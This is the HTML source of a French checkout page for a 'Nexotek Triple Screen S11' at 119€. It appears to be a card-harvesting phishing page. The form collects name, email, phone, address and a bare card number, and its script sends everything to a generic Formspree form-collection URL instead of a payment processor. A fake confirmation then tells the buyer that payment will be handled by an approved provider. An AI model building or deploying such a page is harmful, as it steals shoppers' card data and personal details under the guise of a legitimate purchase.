<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Paiement - Nexotek</title>
  <link rel="stylesheet" href="styles.css" />
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #111;
      color: white;
      margin: 0;
      padding: 0;
    }
    header {
      background-color: #1a1a1a;
      padding: 15px 20px;
      display: flex;
      align-items: center;
    }
    header img {
      height: 40px;
    }
    .container {
      max-width: 600px;
      margin: 40px auto;
      background-color: #1e1e1e;
      padding: 30px;
      border-radius: 8px;
    }
    h1 {
      text-align: center;
      color: #00aaff;
    }
    label {
      display: block;
      margin-top: 15px;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border-radius: 5px;
      border: none;
      background: #333;
      color: white;
    }
    input[type="submit"] {
      background-color: #00aaff;
      color: white;
      font-weight: bold;
      cursor: pointer;
      margin-top: 20px;
    }
    .product {
      text-align: center;
      margin-bottom: 30px;
    }
    .product img {
      width: 100%;
      max-width: 300px;
      margin-bottom: 10px;
    }
    .confirmation {
      display: none;
      text-align: center;
      margin-top: 30px;
    }
  </style>
</head>
<body>
  <header>
    <img src="logo.png" alt="Logo Nexotek" />
  </header>

  <div class="container">
    <div class="product">
      <img src="product.jpg" alt="Nexotek Triple Screen S11" />
      <h1>Nexotek Triple Screen S11 – 119€</h1>
    </div>

    <form id="paymentForm">
      <label>Nom complet :</label>
      <input type="text" name="nom" required />

      <label>Email :</label>
      <input type="email" name="email" required />

      <label>Téléphone :</label>
      <input type="text" name="telephone" required />

      <label>Adresse de livraison :</label>
      <input type="text" name="adresse" required />

      <label>Quantité (max 5) :</label>
      <input type="number" name="quantite" id="quantite" value="1" min="1" max="5" required />

      <label>Total (€) :</label>
      <input type="text" id="total" value="119" readonly />

      <label>Numéro de carte bancaire :</label>
      <input type="text" name="carte" required />

      <input type="submit" value="Valider la commande" />
    </form>

    <div class="confirmation" id="confirmation">
      <h2>Merci pour votre commande !</h2>
      <p>Nous avons bien reçu vos informations.</p>
      <p>Le traitement de votre paiement prendra 10 à 15 minutes via notre prestataire agréé.</p>
    </div>
  </div>

  <script>
    const form = document.getElementById('paymentForm');
    const totalField = document.getElementById('total');
    const quantiteInput = document.getElementById('quantite');
    const confirmation = document.getElementById('confirmation');

    quantiteInput.addEventListener('input', () => {
      const qte = Math.min(5, parseInt(quantiteInput.value) || 1);
      quantiteInput.value = qte;
      totalField.value = qte * 119;
    });

    form.addEventListener('submit', function(e) {
      e.preventDefault();
      const data = new FormData(form);

      fetch("https://formspree.io/f/mvgapayj", {
        method: "POST",
        body: data,
        headers: {
          Accept: "application/json",
        },
      })
      .then(response => {
        form.style.display = "none";
        confirmation.style.display = "block";
      })
      .catch(error => {
        alert("Une erreur est survenue. Merci de réessayer.");
      });
    });
  </script>
</body>
</html>
